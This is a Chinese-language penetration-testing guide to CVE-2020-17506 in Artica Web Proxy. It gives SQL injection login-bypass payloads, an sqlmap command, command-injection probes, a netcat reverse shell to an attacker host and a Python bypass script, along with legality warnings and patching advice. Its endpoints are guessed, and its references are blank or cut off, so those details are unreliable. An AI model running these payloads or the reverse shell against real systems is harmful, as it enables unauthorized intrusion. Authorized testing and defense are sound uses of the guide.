漏洞背景

CVE ID: CVE-2020-17506
影響產品: Artica Web Proxy 4.30.000000
漏洞類型: SQL 注入與身份驗證繞過
描述: 攻擊者可通過特製的 SQL 注入繞過身份驗證，直接獲得後台管理員權限。該漏洞結合了命令注入漏洞，可能允許未經身份驗證的遠程攻擊者執行任意命令。
CVSS 分數: 未明確提供，但由於其高風險性質（身份驗證繞過與命令注入），通常被認為是高危漏洞。
參考:

測試用例與驗證步驟
以下是驗證 CVE-2020-17506 漏洞的通用步驟。請確保在合法授權的測試環境中進行操作，並遵循道德規範。
1. 環境準備

目標系統: 運行 Artica Web Proxy 4.30.000000 的伺服器。
工具:

Burp Suite 或其他代理攔截工具（用於捕獲和修改 HTTP 請求）。
SQLmap（自動化 SQL 注入測試工具）。
瀏覽器或 cURL（用於發送 HTTP 請求）。
命令行工具（如 netcat，用於監聽可能的命令注入結果）。


網路訪問: 確保可以訪問目標 Artica Web Proxy 的管理介面（通常為 HTTP/HTTPS 上的 Web 面板）。

2. 漏洞驗證流程
步驟 1：確認目標版本

訪問 Artica Web Proxy 的管理介面，檢查版本是否為 4.30.000000（通常可在登錄頁面、關於頁面或伺服器響應頭中找到）。
命令範例（使用 cURL 檢查版本）：
bashcurl -I http://<target_ip>:<port>/admin
檢查響應頭或頁面內容，確認版本資訊。

步驟 2：測試 SQL 注入

目標: 確認管理介面是否存在 SQL 注入漏洞。
方法: 使用 Burp Suite 攔截登錄請求，修改登錄表單的參數（如 username 或 password 欄位），注入 SQL 語句。
測試語法（範例 SQL 注入 payload）：
sqlusername=admin' OR '1'='1' -- &password=anything

說明：此 payload 嘗試繞過身份驗證，通過將 username 設置為永遠為真的條件（'1'='1'），使系統接受無效憑證。


使用 Burp Suite 發送修改後的請求，檢查是否成功登錄後台。
自動化測試（使用 SQLmap）：
bashsqlmap -u "http://<target_ip>:<port>/login.php" --data="username=admin&password=anything" --level=3 --risk=3

參數說明：

-u: 目標 URL。
--data: POST 請求的數據。
--level=3: 提高測試深度，檢查更多注入點。
--risk=3: 允許高風險測試，可能觸發危險 payload。





步驟 3：驗證身份驗證繞過

如果 SQL 注入成功，檢查是否獲得管理員權限（例如，訪問後台控制面板）。
檢查後台是否允許執行命令（由於漏洞可能結合命令注入）。
命令注入測試（如果 SQL 注入成功）：

在後台尋找可輸入命令的區域（例如，系統設置或日誌查詢）。
嘗試注入簡單命令，例如：
bash; whoami

如果伺服器返回當前用戶身份（如 admin 或系統用戶），則確認命令注入漏洞存在。


使用 cURL 測試命令注入（假設後台某 API 接受命令）：
bashcurl -X POST http://<target_ip>:<port>/admin/api -d "command=whoami"

檢查響應是否包含命令執行結果。



步驟 4：驗證遠程代碼執行（RCE）

如果命令注入可行，嘗試執行更複雜的命令，例如建立反向 Shell。
範例（反向 Shell）：

在攻擊者機器上啟動監聽：
bashnc -lvnp 4444

在目標後台注入反向 Shell 命令（假設漏洞允許）：
bash; nc -e /bin/bash <attacker_ip> 4444

檢查攻擊者機器是否收到來自目標的 Shell 連接。


注意: 具體命令注入點需根據 Artica Web Proxy 的介面和 API 進行調整，可能需要檢查原始碼或文檔以找到可利用的輸入點。

3. 預期結果

SQL 注入成功: 繞過登錄，獲得管理員權限。
命令注入成功: 執行系統命令（如 whoami）或建立反向 Shell。
失敗情況: 如果目標已修補（例如，升級到更高版本或應用安全補丁），SQL 注入或命令注入將失敗，響應可能為 403（禁止）或無效登錄。

4. 測試用例範例
以下是一個簡單的 Python 腳本，模擬 SQL 注入和命令注入測試（需安裝 requests 模組）：
pythonimport requests

# 目標 URL 和參數
target_url = "http://<target_ip>:<port>/login.php"
data = {
    "username": "admin' OR '1'='1' -- ",
    "password": "anything"
}

# 發送 SQL 注入請求
response = requests.post(target_url, data=data)

# 檢查是否成功登錄
if "Welcome to Admin Panel" in response.text:
    print("SQL Injection successful! Admin access gained.")
    # 嘗試命令注入（假設後台有命令執行 API）
    cmd_url = "http://<target_ip>:<port>/admin/execute"
    cmd_data = {"command": "whoami"}
    cmd_response = requests.post(cmd_url, data=cmd_data)
    print("Command Injection Output:", cmd_response.text)
else:
    print("SQL Injection failed.")

說明: 替換 <target_ip> 和 <port> 為實際目標地址。腳本假設存在一個 /login.php 登錄端點和一個 /admin/execute 命令執行端點（實際端點需根據目標系統調整）。

5. 安全建議

修補漏洞: 升級 Artica Web Proxy 到最新版本，確保修補 CVE-2020-17506。
輸入驗證: 在後台實現嚴格的輸入過濾，防止 SQL 注入和命令注入。
限制訪問: 將管理介面限制為僅限內網訪問（例如，使用防火牆阻擋外部對 80/443 端口的訪問）。
監控日誌: 檢查異常登錄或命令執行嘗試，及時發現潛在攻擊。

注意事項

合法性: 未經授權的漏洞測試是非法的，可能導致法律後果。請確保獲得目標系統擁有者的明確許可。
風險: 測試可能導致系統不穩定或數據丟失，建議在隔離的測試環境中進行。
參考資料: 根據，可參考 Packet Storm 的報告（http://packetstormsecurity.com/files/159267/Artica-Proxy-4.30.000000-Authentication-Bypass-Command-Injection.html）獲取更多技術細節。